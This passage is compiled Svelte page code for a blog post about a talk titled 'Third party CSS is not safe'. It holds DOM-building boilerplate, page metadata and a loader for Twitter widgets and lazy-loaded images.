			append(h23, a30);
			append(a30, t173);
			append(section13, t174);
			append(section13, p44);
			append(p44, t175);
			append(p44, code12);
			append(code12, t176);
			append(p44, t177);
			append(section13, t178);
			append(section13, p45);
			append(p45, picture7);
			append(picture7, source14);
			append(picture7, source15);
			append(picture7, img7);
			append(section13, t179);
			append(section13, p46);
			append(p46, t180);
			append(p46, a31);
			append(a31, t181);
			append(p46, t182);
			append(section13, t183);
			append(section13, p47);
			append(p47, t184);
			append(section13, t185);
			append(section13, p48);
			append(p48, picture8);
			append(picture8, source16);
			append(picture8, source17);
			append(picture8, img8);
			append(section13, t186);
			append(section13, p49);
			append(p49, t187);
			append(section13, t188);
			append(section13, pre8);
			pre8.innerHTML = raw8_value;
			append(section13, t189);
			append(section13, p50);
			append(p50, t190);
			append(p50, code13);
			append(code13, t191);
			append(p50, t192);
			append(section13, t193);
			append(section13, p51);
			append(p51, t194);
			insert(target, t195, anchor);
			insert(target, section14, anchor);
			append(section14, h24);
			append(h24, a32);
			append(a32, t196);
			append(section14, t197);
			append(section14, p52);
			append(p52, t198);
			insert(target, t199, anchor);
			insert(target, section15, anchor);
			append(section15, h25);
			append(h25, a33);
			append(a33, t200);
			append(section15, t201);
			append(section15, ul3);
			append(ul3, li15);
			append(li15, a34);
			append(a34, t202);
			append(ul3, t203);
			append(ul3, li16);
			append(li16, a35);
			append(a35, t204);
			append(ul3, t205);
			append(ul3, li17);
			append(li17, a36);
			append(a36, t206);
			append(ul3, t207);
			append(ul3, li18);
			append(li18, a37);
			append(a37, t208);
			append(ul3, t209);
			append(ul3, li19);
			append(li19, a38);
			append(a38, t210);
		},
		p: noop,
		d(detaching) {
			if (detaching) detach(section0);
			if (detaching) detach(t15);
			if (detaching) detach(p0);
			if (detaching) detach(t19);
			if (detaching) detach(section1);
			if (detaching) detach(t27);
			if (detaching) detach(section2);
			if (detaching) detach(t31);
			if (detaching) detach(section3);
			if (detaching) detach(t42);
			if (detaching) detach(section4);
			if (detaching) detach(t64);
			if (detaching) detach(section5);
			if (detaching) detach(t71);
			if (detaching) detach(section6);
			if (detaching) detach(t75);
			if (detaching) detach(section7);
			if (detaching) detach(t87);
			if (detaching) detach(section8);
			if (detaching) detach(t121);
			if (detaching) detach(section9);
			if (detaching) detach(t126);
			if (detaching) detach(section10);
			if (detaching) detach(t146);
			if (detaching) detach(section11);
			if (detaching) detach(t151);
			if (detaching) detach(section12);
			if (detaching) detach(t172);
			if (detaching) detach(section13);
			if (detaching) detach(t195);
			if (detaching) detach(section14);
			if (detaching) detach(t199);
			if (detaching) detach(section15);
		}
	};
}

function create_fragment$3(ctx) {
	let layout_mdsvex_default;
	let current;
	const layout_mdsvex_default_spread_levels = [metadata];

	let layout_mdsvex_default_props = {
		$$slots: { default: [create_default_slot] },
		$$scope: { ctx }
	};

	for (let i = 0; i < layout_mdsvex_default_spread_levels.length; i += 1) {
		layout_mdsvex_default_props = assign(layout_mdsvex_default_props, layout_mdsvex_default_spread_levels[i]);
	}

	layout_mdsvex_default = new Talk({ props: layout_mdsvex_default_props });

	return {
		c() {
			create_component(layout_mdsvex_default.$$.fragment);
		},
		l(nodes) {
			claim_component(layout_mdsvex_default.$$.fragment, nodes);
		},
		m(target, anchor) {
			mount_component(layout_mdsvex_default, target, anchor);
			current = true;
		},
		p(ctx, [dirty]) {
			const layout_mdsvex_default_changes = (dirty & /*metadata*/ 0)
			? get_spread_update(layout_mdsvex_default_spread_levels, [get_spread_object(metadata)])
			: {};

			if (dirty & /*$$scope*/ 1) {
				layout_mdsvex_default_changes.$$scope = { dirty, ctx };
			}

			layout_mdsvex_default.$set(layout_mdsvex_default_changes);
		},
		i(local) {
			if (current) return;
			transition_in(layout_mdsvex_default.$$.fragment, local);
			current = true;
		},
		o(local) {
			transition_out(layout_mdsvex_default.$$.fragment, local);
			current = false;
		},
		d(detaching) {
			destroy_component(layout_mdsvex_default, detaching);
		}
	};
}

const metadata = {
	"title": "Third party CSS is not safe",
	"occasion": "talk.css meetup",
	"occasionLink": "https://singaporecss.github.io/54/",
	"videoLink": "https://engineers.sg/video/third-party-css-is-not-safe-talk-css-54--4113",
	"date": "2020-09-02",
	"tags": ["css", "vulnerability", "talk.css"],
	"layout": "talk",
	"slug": "third-party-css-is-not-safe",
	"type": "talk"
};

class Page_markup extends SvelteComponent {
	constructor(options) {
		super();
		init(this, options, null, create_fragment$3, safe_not_equal, {});
	}
}

setTimeout(() => {
  const app = new Page_markup({
    target: document.querySelector('#app'),
    hydrate: true,
  });

  if (document.querySelector('.twitter-tweet')) {
    const script = document.createElement('script');
    script.async = true;
    script.src = 'https://platform.twitter.com/widgets.js';
    script.charset = 'utf-8';
    document.body.appendChild(script);
  }

  // TODO
  if ('loading' in HTMLImageElement.prototype) {
    const images = document.querySelectorAll('img[loading="lazy"]');
    images.forEach(img => {
      img.src = img.dataset.src;
    });
  } else {
    const script = document.createElement('script');
    script.src =
      'https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js';
    document.body.appendChild(script);
  }
}, 3000);
